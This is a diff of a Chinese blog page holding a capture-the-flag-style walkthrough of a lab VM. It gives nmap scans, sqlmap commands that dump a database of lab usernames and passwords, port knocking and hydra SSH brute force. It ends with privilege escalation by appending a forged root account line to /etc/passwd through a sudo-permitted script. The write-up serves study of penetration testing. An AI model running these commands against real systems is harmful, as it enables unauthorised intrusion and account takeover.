@@ -296,7 +296,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>5.1k</span>
+              <span>5.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -316,54 +316,99 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>网段     192.168.18.0/24</p>
-<p>kali    192.168.18.131</p>
-<p>靶机    192.168.18.142</p>
+        <h3 id="信息收集">信息收集</h3>
+<h4 id="环境">环境</h4>
+<blockquote>
+<p>网段 192.168.18.0/24</p>
+<p>kali 192.168.18.131</p>
+<p>靶机 192.168.18.142</p>
 </blockquote>
-<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
-<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00039s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.00043s latency).<br>MAC Address: 00:0C:29:C2:75:62 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00018s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds</p>
+<h4 id="扫描网段">扫描网段</h4>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn Starting Nmap 7.91 (
+https://nmap.org ) at 2021-05-10 20:27 CST Nmap scan report for
+192.168.18.2 Host is up (0.00039s latency). MAC Address:
+00:50:56:E0:DA:9A (VMware) Nmap scan report for 192.168.18.142 Host is
+up (0.00043s latency). MAC Address: 00:0C:29:C2:75:62 (VMware) Nmap scan
+report for 192.168.18.254 Host is up (0.00018s latency). MAC Address:
+00:50:56:FD:0E:3D (VMware) Nmap scan report for 192.168.18.131 Host is
+up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds</p>
 </blockquote>
-<h4 id="扫描靶机端口"><a href="#扫描靶机端口" class="headerlink" title="扫描靶机端口"></a>扫描靶机端口</h4><blockquote>
-<p>kali@kali2020:~$ sudo nmap 192.168.18.142 -p- -sV<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:35 CST<br>Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 93.02% done; ETC: 20:36 (0:00:00 remaining)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.0014s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE    SERVICE VERSION<br>22/tcp filtered ssh<br>80/tcp open     http    Apache httpd 2.4.38 ((Debian))<br>MAC Address: 00:0C:29:C2:75:62 (VMware)</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds<br>kali@kali2020:~$ </p>
+<h4 id="扫描靶机端口">扫描靶机端口</h4>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.142 -p- -sV Starting Nmap 7.91
+( https://nmap.org ) at 2021-05-10 20:35 CST Stats: 0:00:08 elapsed; 0
+hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About
+93.02% done; ETC: 20:36 (0:00:00 remaining) Nmap scan report for
+192.168.18.142 Host is up (0.0014s latency). Not shown: 65533 closed
+ports PORT STATE SERVICE VERSION 22/tcp filtered ssh 80/tcp open http
+Apache httpd 2.4.38 ((Debian)) MAC Address: 00:0C:29:C2:75:62
+(VMware)</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 8.70 seconds kali@kali2020:~$</p>
 </blockquote>
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>发现一个搜索框和登录框，看下是否存在sql注入</p>
-<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot; --dbs --batch</code></p>
+<h3 id="sql注入">SQL注入</h3>
+<p>发现一个搜索框和登录框，看下是否存在sql注入</p>
+<p><code>sqlmap -u "http://192.168.18.142/results.php"  --method POST --data "search=a123" --dbs --batch</code></p>
 <p>得到三个数据库</p>
 <blockquote>
-<p>available databases [3]:<br>[*] information_schema<br>[*] Staff<br>[*] users</p>
+<p>available databases [3]: [*] information_schema [*] Staff [*]
+users</p>
 </blockquote>
-<p><code> sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users --tables</code></p>
+<p><code>sqlmap -u "http://192.168.18.142/results.php"  --method POST --data "search=a123"  --batch -D users --tables</code></p>
 <blockquote>
-<p>Database: users<br>[1 table]<br>+————-+<br>| UserDetails |<br>+————-+</p>
+<p>Database: users [1 table] +-------------+ | UserDetails |
++-------------+</p>
 </blockquote>
-<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails --columns</code></p>
+<p><code>sqlmap -u "http://192.168.18.142/results.php"  --method POST --data "search=a123"  --batch -D users -T UserDetails --columns</code></p>
 <blockquote>
-<p>Database: users<br>Table: UserDetails<br>[6 columns]<br>+———–+—————–+<br>| Column    | Type            |<br>+———–+—————–+<br>| firstname | varchar(30)     |<br>| id        | int(6) unsigned |<br>| lastname  | varchar(30)     |<br>| password  | varchar(20)     |<br>| reg_date  | timestamp       |<br>| username  | varchar(30)     |<br>+———–+—————–+</p>
+<p>Database: users Table: UserDetails [6 columns]
++-----------+-----------------+ | Column | Type |
++-----------+-----------------+ | firstname | varchar(30) | | id |
+int(6) unsigned | | lastname | varchar(30) | | password | varchar(20) |
+| reg_date | timestamp | | username | varchar(30) |
++-----------+-----------------+</p>
 </blockquote>
-<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code>结果发现这是display页面的信息换另一个表跑一下</p>
-<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff --tables</code></p>
+<p><code>sqlmap -u "http://192.168.18.142/results.php"  --method POST --data "search=a123"  --batch -D users -T UserDetails -C username,password --dump</code>结果发现这是display页面的信息换另一个表跑一下</p>
+<p><code>sqlmap -u "http://192.168.18.142/results.php"  --method POST --data "search=a123"  --batch -D Staff --tables</code></p>
 <blockquote>
-<p>Database: Staff<br>[2 tables]<br>+————–+<br>| StaffDetails |<br>| Users        |<br>+————–+</p>
+<p>Database: Staff [2 tables] +--------------+ | StaffDetails | | Users
+| +--------------+</p>
 </blockquote>
-<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users --column</code></p>
+<p><code>sqlmap -u "http://192.168.18.142/results.php"  --method POST --data "search=a123"  --batch -D Staff -T Users --column</code></p>
 <blockquote>
-<p>Database: Staff<br>Table: Users<br>[3 columns]<br>+———-+—————–+<br>| Column   | Type            |<br>+———-+—————–+<br>| Password | varchar(255)    |<br>| UserID   | int(6) unsigned |<br>| Username | varchar(255)    |</p>
+<p>Database: Staff Table: Users [3 columns]
++----------+-----------------+ | Column | Type |
++----------+-----------------+ | Password | varchar(255) | | UserID |
+int(6) unsigned | | Username | varchar(255) |</p>
 </blockquote>
-<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users -C Username,Password  --dump</code></p>
+<p><code>sqlmap -u "http://192.168.18.142/results.php"  --method POST --data "search=a123"  --batch -D Staff -T Users -C Username,Password  --dump</code></p>
 <blockquote>
-<p>Database: Staff<br>Table: Users<br>[1 entry]<br>+———-+———————————-+<br>| Username | Password                         |<br>+———-+———————————-+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+———-+———————————-+</p>
+<p>Database: Staff Table: Users [1 entry]
++----------+----------------------------------+ | Username | Password |
++----------+----------------------------------+ | admin |
+856f5de590ef37314e7c3bdf6f8a66dc |
++----------+----------------------------------+</p>
 </blockquote>
-<p>跑出<code>admin</code> <code>856f5de590ef37314e7c3bdf6f8a66dc</code></p>
+<p>跑出<code>admin</code>
+<code>856f5de590ef37314e7c3bdf6f8a66dc</code></p>
 <p>md5解出来<code>transorbital1</code></p>
 <p>跑出另一个数据库的数据</p>
-<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code></p>
+<p><code>sqlmap -u "http://192.168.18.142/results.php"  --method POST --data "search=a123"  --batch -D users -T UserDetails -C username,password --dump</code></p>
 <blockquote>
-<p>Database: users<br>Table: UserDetails<br>[17 entries]<br>+———–+—————+<br>| username  | password      |<br>+———–+—————+<br>| marym     | 3kfs86sfd     |<br>| julied    | 468sfdfsd2    |<br>| fredf     | 4sfd87sfd1    |<br>| barneyr   | RocksOff      |<br>| tomc      | TC&amp;TheBoyz    |<br>| jerrym    | B8m#48sd      |<br>| wilmaf    | Pebbles       |<br>| bettyr    | BamBam01      |<br>| chandlerb | UrAG0D!       |<br>| joeyt     | Passw0rd      |<br>| rachelg   | yN72#dsd      |<br>| rossg     | ILoveRachel   |<br>| monicag   | 3248dsds7s    |<br>| phoebeb   | smellycats    |<br>| scoots    | YR3BVxxxw87   |<br>| janitor   | Ilovepeepee   |<br>| janitor2  | Hawaii-Five-0 |<br>+———–+—————+</p>
+<p>Database: users Table: UserDetails [17 entries]
++-----------+---------------+ | username | password |
++-----------+---------------+ | marym | 3kfs86sfd | | julied |
+468sfdfsd2 | | fredf | 4sfd87sfd1 | | barneyr | RocksOff | | tomc |
+TC&amp;TheBoyz | | jerrym | B8m#48sd | | wilmaf | Pebbles | | bettyr |
+BamBam01 | | chandlerb | UrAG0D! | | joeyt | Passw0rd | | rachelg |
+yN72#dsd | | rossg | ILoveRachel | | monicag | 3248dsds7s | | phoebeb |
+smellycats | | scoots | YR3BVxxxw87 | | janitor | Ilovepeepee | |
+janitor2 | Hawaii-Five-0 | +-----------+---------------+</p>
 </blockquote>
 <p>去<code>manage.php</code>登录下试试,成功登录</p>
-<p>页面左下角有一个<code> File does not exist</code>推测有本地文件包含漏洞</p>
+<p>页面左下角有一个<code>File does not exist</code>推测有本地文件包含漏洞</p>
 <p><img src="/posts/73305909/file_include_etcpasswd.png"></p>
 <p><img src="/posts/73305909/Wappalyzer.png"></p>
 <p>使用的apache</p>
@@ -372,13 +417,12 @@
 <p><img src="/posts/73305909/intruder.png"></p>
 <p>去试试之前跑出来的用户账号能不能ssh登录</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># username</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
-
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#passwd</span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/73305909/ssh_connect_error.png"></p>
 <p>发现全是连接失败，但是nmap扫描端口的时候22端口是开放的</p>
-<p>网上搜了下，这是使用的<strong>knock服务(端口敲门服务)</strong> </p>
-<h3 id="knock服务"><a href="#knock服务" class="headerlink" title="knock服务"></a>knock服务</h3><p>Knockd的配置文件路径为<code>/etc/knockd.conf</code></p>
+<p>网上搜了下，这是使用的<strong>knock服务(端口敲门服务)</strong></p>
+<h3 id="knock服务">knock服务</h3>
+<p>Knockd的配置文件路径为<code>/etc/knockd.conf</code></p>
 <p><img src="/posts/73305909/knockd_conf.png"></p>
 <p>开放了<code>7469</code>,<code>8475</code>,<code>9842</code>三个端口</p>
 <p>在默认情况下，22端口是关闭的，只有访问了以上三个端口后，22端口才会开放。</p>
@@ -388,53 +432,56 @@
 <p><img src="/posts/73305909/hydra1.png"></p>
 <p>最后试出了三组可以ssh登录的账号</p>
 <blockquote>
-<p>chandlerb   UrAG0D!<br>joeyt       Passw0rd<br>janitor     Ilovepeepee</p>
+<p>chandlerb UrAG0D! joeyt Passw0rd janitor Ilovepeepee</p>
 </blockquote>
 <p><img src="/posts/73305909/ssh1.png"></p>
 <p>在<code>janitor</code>用户下发现一个隐藏文件夹，里面包含一个密码本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># passwords-found-on-post-it-notes.txt </span><br><span class="line"></span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/73305909/hydra2.png"></p>
 <p>跑出了一个账号</p>
 <p><code>fredf</code> <code>B4-Tru3-001</code></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img src="/posts/73305909/fredf_sudo.png"></p>
+<h3 id="提权">提权</h3>
+<p><img src="/posts/73305909/fredf_sudo.png"></p>
 <p>不需要密码可以执行<code>/opt/devstuff/dist/test/test</code></p>
 <p><img src="/posts/73305909/testpy.png"></p>
 <p>提示test是个py文件</p>
 <p>找一下test.py</p>
-<p><code>find / -name &quot;test.py&quot; 2&gt;/dev/null</code></p>
+<p><code>find / -name "test.py" 2&gt;/dev/null</code></p>
 <p><img src="/posts/73305909/find_test.png"></p>
 <p>发现两个文件</p>
 <blockquote>
-<p>/opt/devstuff/test.py<br>/usr/lib/python3/dist-packages/setuptools/command/test.py</p>
+<p>/opt/devstuff/test.py
+/usr/lib/python3/dist-packages/setuptools/command/test.py</p>
 </blockquote>
 <p>估计只有第一个可以用得上</p>
 <p><code>cat /opt/devstuff/test.py</code></p>
 <p><img src="/posts/73305909/testpy1.png"></p>
 <p>需要两个参数，把第一个参数的内容追加到第二个文件中</p>
 <p>使用openssl创建一个用户</p>
-<p><code> openssl  passwd -1 -salt Mamor 123456</code><br><code>$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/</code></p>
+<p><code>openssl  passwd -1 -salt Mamor 123456</code>
+<code>$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/</code></p>
 <p>构造一个用户</p>
 <p><code>Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash</code></p>
-<p>echo “Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash” &gt; /tmp/mamor</p>
+<p>echo "Mamor:<span class="math inline">\(1\)</span>Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash"
+&gt; /tmp/mamor</p>
 <p>sudo ./test /tmp/mamor /etc/passswd</p>
 <p>构造失败没法写入</p>
-<p><code>cat  /tmp/mamor </code></p>
+<p><code>cat  /tmp/mamor</code></p>
 <p><img src="/posts/73305909/usercreate_error.png"></p>
 <p>发现写入的数据并不是原数据</p>
-<p>换<code>&#39;</code>试试</p>
-<p><code>echo &#39;Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash&#39; &gt; /tmp/mamor1</code></p>
+<p>换<code>'</code>试试</p>
+<p><code>echo 'Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash' &gt; /tmp/mamor1</code></p>
 <p><img src="/posts/73305909/usercreate.png"></p>
 <p>还是没法写入</p>
 <p><code>openssl passwd -1 -salt test test</code></p>
 <blockquote>
-<p>$1$test$pi/xDtU5WFVRqYS6BMU8X/</p>
+<p><span class="math inline">\(1\)</span>test$pi/xDtU5WFVRqYS6BMU8X/</p>
 </blockquote>
-<p><code>echo &#39;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash&#39; &gt;&gt; /tmp/testtest</code></p>
+<p><code>echo 'test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash' &gt;&gt; /tmp/testtest</code></p>
 <p><code>sudo ./test /tmp/testtest /etc/passwd</code></p>
 <p><code>cat /etc/passwd</code></p>
 <blockquote>
-<p>test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash</p>
+<p>test:<span class="math inline">\(1\)</span>test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash</p>
 </blockquote>
 <p>这次写入成功</p>
 <p><img src="/posts/73305909/flag.png"></p>
@@ -567,7 +614,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E6%AE%B5"><span class="nav-number">1.2.</span> <span class="nav-text">扫描网段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA%E7%AB%AF%E5%8F%A3"><span class="nav-number">1.3.</span> <span class="nav-text">扫描靶机端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#knock%E6%9C%8D%E5%8A%A1"><span class="nav-number">3.</span> <span class="nav-text">knock服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E6%AE%B5"><span class="nav-number">1.2.</span> <span class="nav-text">扫描网段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA%E7%AB%AF%E5%8F%A3"><span class="nav-number">1.3.</span> <span class="nav-text">扫描靶机端口</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#knock%E6%9C%8D%E5%8A%A1"><span class="nav-number">3.</span> <span class="nav-text">knock服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -583,7 +630,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -631,7 +678,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -645,7 +692,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -656,7 +703,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -796,6 +843,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
